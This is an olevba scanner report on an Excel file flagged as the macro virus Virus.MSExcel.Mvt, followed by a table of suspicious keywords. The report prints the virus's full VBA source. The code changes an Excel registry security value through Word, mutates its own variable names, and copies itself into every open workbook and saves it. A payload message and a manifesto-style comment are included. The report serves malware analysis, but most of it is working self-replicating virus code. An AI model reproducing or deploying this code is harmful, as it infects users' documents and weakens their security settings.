olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Mvt-ed0273b12de662ba27a34ca941b086c06fb48029
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: Virus.MSExcel.Mvt-ed0273b12de662ba27a34ca941b086c06fb48029 - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Deactivate() 'Fr33d0m
Set OBJ = CreateObject("word.application"): OBJ.system.privateprofilestring("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = &H0: OBJ.Quit
FULLCODE = ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(1, 15)
Dim VARIABLE(1 To 8)
VARIABLE(1) = "OBJ": VARIABLE(2) = "FULLCODE": VARIABLE(3) = "VARIABLE": VARIABLE(4) = "OUR_LOOP": VARIABLE(5) = "NEW_VAR": VARIABLE(6) = "VAR_POSITION": VARIABLE(7) = "NEXT_ONE": VARIABLE(8) = "TARGET"
For OUR_LOOP = 1 To 8
NEW_VAR = Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22)) & Int(Rnd * 999)
VAR_POSITION = 1
NEXT_ONE: VAR_POSITION = InStr(VAR_POSITION, FULLCODE, VARIABLE(OUR_LOOP))
If VAR_POSITION <> 0 Then FULLCODE = Mid(FULLCODE, 1, (VAR_POSITION - 1)) & NEW_VAR & Mid(FULLCODE, (VAR_POSITION + Len(VARIABLE(OUR_LOOP))), Len(FULLCODE)): GoTo NEXT_ONE
Next
For Each TARGET In Workbooks
If TARGET.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(1, 1) <> "Private Sub Workbook_Deactivate() 'Fr33d0m" Then TARGET.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.AddFromString FULLCODE: TARGET.SaveAs TARGET.FullName
Next
If Minute(Now()) = Second(Now()) Then MsgBox ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(17, 7), 0, "Class.Freed0m by jackie twoflower /Lz0NT /MVT /CC"
End Sub
' Remorse in all forms will be removed from human thoughts
' and actions. Freedom will only be available through revolution
' or death. This system of a down is unavoidable as life on
' this planet becomes unneccessary.

' Open your eyes, open your mouths, close your hands and
' make a fist!
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Virus.MSExcel.Mvt-ed0273b12de662ba27a34ca941b086c06fb48029 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: Virus.MSExcel.Mvt-ed0273b12de662ba27a34ca941b086c06fb48029 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: Virus.MSExcel.Mvt-ed0273b12de662ba27a34ca941b086c06fb48029 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

